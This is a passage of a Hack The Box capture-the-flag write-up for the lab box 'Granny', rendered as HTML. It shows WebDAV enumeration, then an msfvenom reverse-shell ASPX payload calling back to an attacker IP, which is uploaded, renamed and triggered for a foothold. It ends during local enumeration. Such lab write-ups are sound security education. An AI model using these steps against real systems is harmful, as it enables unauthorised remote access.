@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta description="This is an easy Windows box.">
+    
+    <title>
+        
+            Granny | mmezirard
+        
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Granny<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-12-02</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/granny/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#remote-enumeration">Remote enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#host-discovery">Host discovery</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#tcp-port-scanning">TCP port scanning</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#service-fingerprinting">Service fingerprinting</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#scripts">Scripts</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#iis-port-80-tcp">IIS (port 80&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#http-headers">HTTP headers</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#webdav">WebDAV</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#foothold-webdav-file-upload">Foothold (WebDAV file upload)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#preparation">Preparation</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#exploitation">Exploitation</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#local-enumeration">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#version">Version</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#architecture">Architecture</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#windows-defender">Windows Defender</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#amsi">AMSI</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#firewall">Firewall</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#nics">NICs</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#local-users">Local users</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#local-groups">Local groups</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#user-account-information">User account information</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#home-folder">Home folder</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#command-history">Command history</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#tokens">Tokens</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#privilege-escalation-token-kidnapping">Privilege escalation (token kidnapping)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#preparation-1">Preparation</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#exploitation-1">Exploitation</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#local-enumeration-1">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#home-folder-1">Home folder</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/granny/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Windows</p>
+<p><strong>Release date</strong>: 2017-04-12</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/1">ch4p</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great practice security-wise, but it's a VM so it's alright. This way I won't have to prefix some commands with <code>sudo</code>, which gets cumbersome in the long run. Heck, it's hard enough to remember the flags for the commands without needing to know the privileges required to run them too!</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box. I'll call it <code>workspace</code>, and it will be located at the root of my filesystem <code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll run <code>httpsimpleserver</code> to create an HTTP server and <code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make files in this folder available over the Internet, which will be especially useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory. This will come in handy once we get a foothold, for privilege escalation and for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the complexity of some exploits, and prefer a more manual approach when it's not too much hassle to really understand what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.5</code>, while the target machine's IP address will be <code>10.10.10.15</code>. The commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever need to transfer files or binaries to the target machine I'll always place them in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="remote-enumeration">Remote enumeration</h1>
+<h2 id="host-discovery">Host discovery</h2>
+<p>Well, we already know the IP we are targeting, so this phase is actually empty!</p>
+<h2 id="tcp-port-scanning">TCP port scanning</h2>
+<p>As usual, I'll initiate a port scan on Granny using a TCP SYN <code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.15<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="service-fingerprinting">Service fingerprinting</h2>
+<p>Following the port scan, let's gather more data about the service associated with the open port we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.15<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 80<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">PORT     STATE SERVICE      VERSION
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">80/tcp open  http    Microsoft IIS httpd 6.0
+</span><span class="z-text z-plain">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so apparently Granny is running Windows.</p>
+<h2 id="scripts">Scripts</h2>
+<p>Let's run <code>nmap</code>'s default scripts on this service to see if they can find additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.15<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 80<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: Under Construction
+</span><span class="z-text z-plain">| http-methods: 
+</span><span class="z-text z-plain">|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+</span><span class="z-text z-plain">| http-webdav-scan: 
+</span><span class="z-text z-plain">|   Server Type: Microsoft-IIS/6.0
+</span><span class="z-text z-plain">|   WebDAV type: Unknown
+</span><span class="z-text z-plain">|   Server Date: Sun, 26 Nov 2023 14:41:42 GMT
+</span><span class="z-text z-plain">|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+</span><span class="z-text z-plain">|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>This scan reveals that IIS is using WebDAV, and it allows methods like <code>PUT</code> and <code>COPY</code>. Seems like a great way to get a foothold!</p>
+<p>Let's explore the IIS web server and see if we manage to get a shell.</p>
+<h2 id="iis-port-80-tcp">IIS (port <code>80/tcp</code>)</h2>
+<p>Let's browse to <code>http://10.10.10.15/</code> and see what we get.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/granny/iis-homepage.png" alt="IIS homepage" /></p>
+<p>So apparently, this website is 'Under construction', and it doesn't have a default website, so this is why we see this strange web page.</p>
+<h3 id="http-headers">HTTP headers</h3>
+<p>Let's check out the HTTP response headers when we request the homepage.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl http://10.10.10.15/<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>I</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HTTP/1.1 200 OK
+</span><span class="z-text z-plain">Content-Length: 1433
+</span><span class="z-text z-plain">Content-Type: text/html
+</span><span class="z-text z-plain">Content-Location: http://10.10.10.15/iisstart.htm
+</span><span class="z-text z-plain">Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
+</span><span class="z-text z-plain">Accept-Ranges: bytes
+</span><span class="z-text z-plain">ETag: &quot;05b3daec0d9c21:392&quot;
+</span><span class="z-text z-plain">Server: Microsoft-IIS/6.0
+</span><span class="z-text z-plain">MicrosoftOfficeWebServer: 5.0_Pub
+</span><span class="z-text z-plain">X-Powered-By: ASP.NET
+</span><span class="z-text z-plain">Date: Sun, 26 Nov 2023 14:34:01 GMT
+</span></code></pre>
+<p>The <code>Server</code> header confirms that this server is using Microsoft IIS version <code>6.0</code>. Moreover, the <code>X-Powered-By</code> header reveals that the web server uses ASP.NET files.</p>
+<p>That's interesting, because we know that we can use WebDAV to upload files to the server. If we could execute our own files, we would get RCE!</p>
+<h3 id="webdav">WebDAV</h3>
+<p>Let's use <code>davtest</code> to explore the WebDAV path further.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> davtest<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>url</span> http://10.10.10.15/</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">********************************************************
+</span><span class="z-text z-plain"> Testing DAV connection
+</span><span class="z-text z-plain">OPEN            SUCCEED:                http://10.10.10.15
+</span><span class="z-text z-plain">********************************************************
+</span><span class="z-text z-plain">NOTE    Random string for this session: odbFSm
+</span><span class="z-text z-plain">********************************************************
+</span><span class="z-text z-plain"> Creating directory
+</span><span class="z-text z-plain">MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_odbFSm
+</span><span class="z-text z-plain">********************************************************
+</span><span class="z-text z-plain"> Sending test files
+</span><span class="z-text z-plain">PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.txt
+</span><span class="z-text z-plain">PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.jsp
+</span><span class="z-text z-plain">PUT     shtml   FAIL
+</span><span class="z-text z-plain">PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.cfm
+</span><span class="z-text z-plain">PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.php
+</span><span class="z-text z-plain">PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.pl
+</span><span class="z-text z-plain">PUT     aspx    FAIL
+</span><span class="z-text z-plain">PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.html
+</span><span class="z-text z-plain">PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.jhtml
+</span><span class="z-text z-plain">PUT     cgi     FAIL
+</span><span class="z-text z-plain">PUT     asp     FAIL
+</span><span class="z-text z-plain">********************************************************
+</span><span class="z-text z-plain"> Checking for test file execution
+</span><span class="z-text z-plain">EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.txt
+</span><span class="z-text z-plain">EXEC    txt     FAIL
+</span><span class="z-text z-plain">EXEC    jsp     FAIL
+</span><span class="z-text z-plain">EXEC    cfm     FAIL
+</span><span class="z-text z-plain">EXEC    php     FAIL
+</span><span class="z-text z-plain">EXEC    pl      FAIL
+</span><span class="z-text z-plain">EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.html
+</span><span class="z-text z-plain">EXEC    html    FAIL
+</span><span class="z-text z-plain">EXEC    jhtml   FAIL
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">********************************************************
+</span><span class="z-text z-plain">/usr/bin/davtest Summary:
+</span><span class="z-text z-plain">Created: http://10.10.10.15/DavTestDir_odbFSm
+</span><span class="z-text z-plain">PUT File: http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.txt
+</span><span class="z-text z-plain">PUT File: http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.jsp
+</span><span class="z-text z-plain">PUT File: http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.cfm
+</span><span class="z-text z-plain">PUT File: http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.php
+</span><span class="z-text z-plain">PUT File: http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.pl
+</span><span class="z-text z-plain">PUT File: http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.html
+</span><span class="z-text z-plain">PUT File: http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.jhtml
+</span><span class="z-text z-plain">Executes: http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.txt
+</span><span class="z-text z-plain">Executes: http://10.10.10.15/DavTestDir_odbFSm/davtest_odbFSm.html
+</span></code></pre>
+<p>Apparently, we can only execute <code>.txt</code> and <code>.html</code> files, and we can't upload <code>.aspx</code> files. That's not a good news!</p>
+<p>However, the <code>MOVE</code> method is allowed, so in theory nothing prevents us from uploading a benign <code>.txt</code> file and move it to a <code>.aspx</code> file.</p>
+<h1 id="foothold-webdav-file-upload">Foothold (WebDAV file upload)</h1>
+<p>Let's test this idea.</p>
+<h2 id="preparation">Preparation</h2>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> 9001</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">listening on [any] 9001 ...
+</span></code></pre>
+<p>Then I'll use <code>msfvenom</code> to create the payload.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> msfvenom<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> aspx<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> /workspace/revshell.txt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span><span class="z-text z-plain">[-] No arch selected, selecting arch: x86 from the payload
+</span><span class="z-text z-plain">No encoder specified, outputting raw payload
+</span><span class="z-text z-plain">Payload size: 324 bytes
+</span><span class="z-text z-plain">Final size of aspx file: 2723 bytes
+</span><span class="z-text z-plain">Saved as: /workspace/revshell.txt
+</span></code></pre>
+<h2 id="exploitation">Exploitation</h2>
+<p>I'm going to use <code>cadaever</code> to interact more efficiently with Granny's WebDAV server.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> cadaver 10.10.10.15</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">dav:/&gt;
+</span></code></pre>
+<p>Let's begin by uploading our <code>revshell.txt</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">dav:/</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> put /workspace/revshell.txt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Uploading /workspace/revshell.txt to `/revshell.txt&#39;:
+</span><span class="z-text z-plain">Progress: [=============================&gt;] 100.0% of 2736 bytes succeeded.
+</span></code></pre>
+<p>Okay, it worked. Now let's move <code>revshell.txt</code> to <code>revshell.aspx</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">dav:/</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> mv revshell.txt revshell.aspx</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Moving `/revshell.txt&#39; to `/revshell.aspx&#39;:  succeeded.
+</span></code></pre>
+<p>Once again, it went off without a hitch!</p>
+<p>Now let's trigger our payload:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl http://10.10.10.15/revshell.aspx<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span></span>
+</span></code></pre>
+<p>And if we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.5] from (UNKNOWN) [10.10.10.15] 1031
+</span><span class="z-text z-plain">Microsoft Windows [Version 5.2.3790]
+</span><span class="z-text z-plain">(C) Copyright 1985-2003 Microsoft Corp.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">c:\windows\system32\inetsrv&gt;
+</span></code></pre>
+<p>It caught the reverse shell! Nice!</p>
+<p>Unfortunately, Powershell doesn't exist on this box.</p>
+<h1 id="local-enumeration">Local enumeration</h1>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>NT AUTHORITY\SERVICE</code>.</p>
+<h2 id="version">Version</h2>
+<p>Let's gather some information about the Windows version of Granny.</p>
+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">reg</span> <span class="z-keyword z-command z-dosbatch">query</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> /v ProductName
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+</span><span class="z-text z-plain">    ProductName    REG_SZ    Microsoft Windows Server 2003 R2
+</span></code></pre>
+<p>Waouh! That's Windows Server 2003. It's a really old version! There must be a ton of vulnerabilities here.</p>
+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">reg</span> <span class="z-keyword z-command z-dosbatch">query</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> /v CurrentBuildNumber
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+</span><span class="z-text z-plain">    CurrentBuildNumber    REG_SZ    3790
+</span></code></pre>
+<p>And this is build <code>3790</code>.</p>
+<h2 id="architecture">Architecture</h2>
+<p>What is Granny's architecture?</p>
+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">reg</span> <span class="z-keyword z-command z-dosbatch">query</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> /v PROCESSOR_ARCHITECTURE
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
+</span><span class="z-text z-plain">    PROCESSOR_ARCHITECTURE    REG_SZ    x86
+</span></code></pre>
+<p>So this system is using x86. This will be useful to know if we want to compile our own exploits.</p>
+<h2 id="windows-defender">Windows Defender</h2>
+<p>Since Granny is running Windows Server 2003, Windows Defender doesn't exist.</p>
+<h2 id="amsi">AMSI</h2>
+<p>As for Windows Defender, this box is too old to have an AMSI provider.</p>
+<h2 id="firewall">Firewall</h2>
+<p>Let's see which Windows Firewall policies profiles are enabled.</p>
+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">reg</span> <span class="z-keyword z-command z-dosbatch">query</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> /s /v EnableFirewall
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile
+</span><span class="z-text z-plain">    EnableFirewall    REG_DWORD    0x0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile
+</span><span class="z-text z-plain">    EnableFirewall    REG_DWORD    0x1
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">End of search: 2 match(es) found.
+</span></code></pre>
+<p>Okay, so all Firewall profiles are enabled. It shouldn't hinder our progression too much though: since we alreay managed to obtain a reverse shell, the protections should be really basic.</p>
+<h2 id="nics">NICs</h2>
+<p>Let's gather the list of connected NICs.</p>
